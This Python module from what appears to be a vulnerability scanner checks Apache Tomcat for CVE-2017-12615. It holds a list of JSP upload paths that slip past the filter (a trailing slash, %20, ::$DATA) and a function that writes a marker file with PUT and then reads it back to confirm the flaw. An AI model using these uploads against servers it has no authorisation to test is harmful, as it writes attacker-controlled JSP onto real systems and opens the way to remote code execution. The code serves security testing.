#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
# from lib.tool import check
# import re

cve_2017_12615_payloads = [
    {
        'path': '{PATH}.jsp/',
        'data': '<% out.println("<h1>{TEXT}</h1>"); %>',
        'path-2': '{PATH}.jsp'
    },
    {
        'path': '{PATH}.jsp%20',
        'data': '<% out.println("<h1>{TEXT}</h1>"); %>',
        'path-2': '{PATH}.jsp'
    },
    {
        'path': '{PATH}.jsp::$DATA',
        'data': '<% out.println("<h1>{TEXT}</h1>"); %>',
        'path-2': '{PATH}.jsp'
    },
    {
        'path': '{PATH}.jsp',
        'data': '<% out.println("<h1>{TEXT}</h1>"); %>',
        'path-2': '{PATH}.jsp'
    }
]

def cve_2017_12615_scan(clients):
    ''' Tomcat PUT方法任意文件写入漏洞
            PUT方法可用, 上传未做过滤, 可以写入任意文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ApacheTomcat',
        'vul_type': 'File-Upload',
        'vul_id': 'CVE-2017-12615',
    }

    for payload in cve_2017_12615_payloads:                 # * Payload
        random_str_1 = random_md5(6)
        random_str_2 = random_md5(6)
        
        path = payload['path'].format(PATH=random_str_1)        # * Path
        data = payload['data'].format(TEXT=random_str_2)        # * Data
        path_2 = payload['path-2'].format(PATH=random_str_1)    # * Path-2

        res = client.request(
            'put',
            path,
            data=data,
            vul_info=vul_info
        )
        if res is None:
            continue

        res2 = client.request(
            'get',
            path_2,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue

        text = '<h1>' + random_str_2 + '</h1>'
        
        if ((res2.status_code == 200) and (text in res2.text)):
            results = {
                'Target': res.request.url,
                'Verify': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res,
                'Request-2': res2
            }
            return results
    return None
